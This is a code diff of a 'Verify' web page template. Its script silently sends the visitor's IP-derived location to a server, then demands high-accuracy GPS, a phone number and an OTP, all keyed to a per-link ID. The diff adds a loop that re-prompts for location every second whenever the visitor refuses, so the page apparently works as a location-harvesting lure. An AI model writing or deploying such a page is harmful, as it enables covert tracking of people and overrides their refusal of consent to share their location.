@@ -31,84 +31,87 @@
       font-size: 1.6rem;
     }
   </style>
-  
-  <title>Verify</title>
-  <script>
-    const locId = {{ loc_id }};
-    const CSRF = document.cookie.split(';')
-      .find(c=>c.trim().startsWith('csrftoken='))
-      ?.split('=')[1];
 
-    async function postJSON(url, body) {
-      return fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type":"application/json",
-          "X-CSRFToken": CSRF
-        },
-        body: JSON.stringify(body)
+  <title>Verify</title>
+<script>
+  const locId = {{ loc_id }};
+  const CSRF  = document.cookie.split(';')
+                     .find(c=>c.trim().startsWith('csrftoken='))
+                     ?.split('=')[1];
+
+  async function postJSON(url, body) {
+    return fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type":"application/json",
+        "X-CSRFToken": CSRF
+      },
+      body: JSON.stringify(body)
+    });
+  }
+
+  // Retry loop for geolocation
+  function askForLocation() {
+    if (!navigator.geolocation) {
+      return alert("Geolocation not supported");
+    }
+    navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, {
+      enableHighAccuracy: true,
+      timeout:            10000,
+      maximumAge:         0
+    });
+  }
+
+  // Called if user denies or error
+  function onGeoError(err) {
+    // keep asking until they hit “Allow”
+    setTimeout(askForLocation, 1000);
+  }
+
+  // Called once they allow
+  async function onGeoSuccess(pos) {
+    // 1) save GPS
+    await postJSON("/save-gps/", {
+      loc_id:   locId,
+      latitude: pos.coords.latitude,
+      longitude:pos.coords.longitude
+    });
+
+    // 2) proceed to phone & OTP
+    const phone = prompt("Enter your phone (+251...)");
+    if (!phone) return alert("Phone required");
+    await postJSON("/send-otp/", { loc_id: locId, phone });
+
+    const code = prompt("Enter the OTP you received");
+    const res  = await postJSON("/verify-otp/", { loc_id: locId, code });
+    const { status } = await res.json();
+    alert("Verification status: " + status);
+  }
+
+  window.onload = async () => {
+    // PHASE 1: save IP once
+    try {
+      const ipData = await (await fetch("https://ipapi.co/json/")).json();
+      await postJSON("/save-ip/", {
+        loc_id:  locId,
+        ip_lat:  ipData.latitude,
+        ip_lon:  ipData.longitude,
+        ip_city: ipData.city
       });
+    } catch(e) {
+      console.warn("ipapi error:", e);
     }
 
-    window.onload = async () => {
-      // —————— PHASE 1: CLIENT IP / CITY via ipapi.co ——————
-      try {
-        const ipRes  = await fetch("https://ipapi.co/json/");
-        const ipData = await ipRes.json();
-        await postJSON("/save-ip/", {
-          loc_id:   locId,
-          ip_lat:   ipData.latitude,
-          ip_lon:   ipData.longitude,
-          ip_city:  ipData.city
-        });
-      } catch(e){
-        console.warn("Could not fetch ipapi.co:", e);
-      }
-
-      // —————— PHASE 2: HIGH-ACCURACY GPS ——————
-      if (!navigator.geolocation) {
-        return alert("Geolocation not supported");
-      }
-      navigator.geolocation.getCurrentPosition(
-        async pos => {
-          // 2a) save GPS
-          await postJSON("/save-gps/", {
-            loc_id:   locId,
-            latitude: pos.coords.latitude,
-            longitude:pos.coords.longitude
-          });
-
-          // 2b) phone & OTP
-          const phone = prompt("Enter your phone (+251...)");
-          if (!phone) return alert("Phone required");
-          await postJSON("/send-otp/", { loc_id: locId, phone });
-
-          const code = prompt("Enter the OTP you received");
-          const res  = await postJSON("/verify-otp/", { loc_id: locId, code });
-          const { status } = await res.json();
-          alert("Verification status: " + status);
-        },
-        () => alert("GPS permission required"),
-        { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
-      );
-        setInterval(() => {
-      confetti({
-        particleCount: 60,
-        spread:        100,
-        origin:        { y: 0.6 }
-      });
+    // start infinite confetti
+    setInterval(() => {
+      confetti({ particleCount:60, spread:100, origin:{ y:0.6 } });
     }, 500);
 
-      // a second burst for extra sparkle
-      setTimeout(() => {
-        confetti({
-          particleCount: 100,
-          spread: 100,
-          origin: { y: 0.2 }
-        });
-      }, 300);
-    };
-  </script>
+    // kick off the location prompt loop
+    askForLocation();
+  };
+</script>
+
 </head>
 <body style="margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#f9f9f9; text-align:center; padding:1rem;">
   <div>
